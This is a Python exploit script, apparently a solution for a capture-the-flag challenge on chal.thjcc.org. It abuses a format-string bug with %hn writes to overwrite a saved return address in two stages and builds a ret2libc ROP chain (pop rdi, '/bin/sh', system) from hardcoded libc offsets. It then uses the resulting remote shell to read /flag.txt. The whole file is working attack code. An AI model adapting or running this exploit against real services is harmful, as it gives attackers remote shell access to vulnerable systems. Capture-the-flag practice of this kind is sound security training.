#!/usr/bin/env python3
import socket
import struct
import time
import re

HOST = "chal.thjcc.org"
PORT = 10021

# Stack slot discovered from format-string probing on this service.
RET_SLOT = 0x7FFFFFFFEC68

# Service appears to run with fixed libc mapping.
LIBC_BASE = 0x7FFFF7D90000

RET76 = 0x9D76  # low 16 bits of (LIBC_BASE + 0x29d76)
POP_RDI = LIBC_BASE + 0x2A3E5
BINSH = LIBC_BASE + 0x1D8678
SYSTEM = LIBC_BASE + 0x50D70
RET_GADGET = 0x40101A


def recv_until_prompt(sock, timeout=3.0):
    end = time.time() + timeout
    data = b""
    marker = b"MYGO Database Admin Token: "
    while time.time() < end and marker not in data:
        try:
            sock.settimeout(max(0.05, end - time.time()))
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except Exception:
            pass
    return data


def recv_some(sock, seconds=1.0):
    end = time.time() + seconds
    data = b""
    while time.time() < end:
        try:
            sock.settimeout(0.12)
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except Exception:
            pass
    return data


def mk_hn_write(addr, value):
    # Write 16-bit value with %10$hn. Arg10 is bytes 16..23 in our input buffer.
    if value == 0:
        fmt = b"%10$hn"
    else:
        fmt = f"%{value}c%10$hn".encode()
    if len(fmt) > 16:
        raise ValueError(f"format too long for value={value}: len={len(fmt)}")
    return fmt + b"A" * (16 - len(fmt)) + struct.pack("<Q", addr)


def send_try(sock, payload):
    sock.sendall(payload + b"\n")
    return recv_until_prompt(sock, 3.0)


def main():
    s = socket.socket()
    s.settimeout(6)
    s.connect((HOST, PORT))
    recv_until_prompt(s, 3.0)

    # Stage 1:
    # 1) Make main return into __libc_start_call_main+0x16 (0x...9d76),
    #    which re-calls function pointer from startup stack (main), giving a fresh 10 tries.
    # 2) Preload ec70..ec84 for final ROP chain (pop rdi, system).
    stage1 = [
        (RET_SLOT + 0, RET76),
        (RET_SLOT + 8, POP_RDI & 0xFFFF),
        (RET_SLOT + 10, (POP_RDI >> 16) & 0xFFFF),
        (RET_SLOT + 12, (POP_RDI >> 32) & 0xFFFF),
        (RET_SLOT + 24, SYSTEM & 0xFFFF),
        (RET_SLOT + 26, (SYSTEM >> 16) & 0xFFFF),
        (RET_SLOT + 28, (SYSTEM >> 32) & 0xFFFF),
    ]

    tries = 0
    for addr, val in stage1:
        send_try(s, mk_hn_write(addr, val))
        tries += 1
    while tries < 10:
        send_try(s, b"x")
        tries += 1

    # Stage 2 (fresh main):
    # ec68 -> ret ; ec70 already pop rdi ; ec78 -> /bin/sh ; ec80 already system
    stage2 = [
        (RET_SLOT + 0, RET_GADGET & 0xFFFF),
        (RET_SLOT + 2, (RET_GADGET >> 16) & 0xFFFF),
        (RET_SLOT + 4, (RET_GADGET >> 32) & 0xFFFF),
        (RET_SLOT + 16, BINSH & 0xFFFF),
        (RET_SLOT + 18, (BINSH >> 16) & 0xFFFF),
        (RET_SLOT + 20, (BINSH >> 32) & 0xFFFF),
    ]

    tries2 = 0
    for addr, val in stage2:
        send_try(s, mk_hn_write(addr, val))
        tries2 += 1
    while tries2 < 10:
        send_try(s, b"x")
        tries2 += 1

    # Shell should be alive now.
    recv_some(s, 1.2)
    s.sendall(b"cat /flag.txt\n")
    out = recv_some(s, 2.0)

    m = re.search(rb"THJCC\{[^}]+\}", out)
    if m:
        print(m.group(0).decode())
    else:
        print(out.decode("latin1", "replace"))

    s.sendall(b"exit\n")
    s.close()


if __name__ == "__main__":
    main()
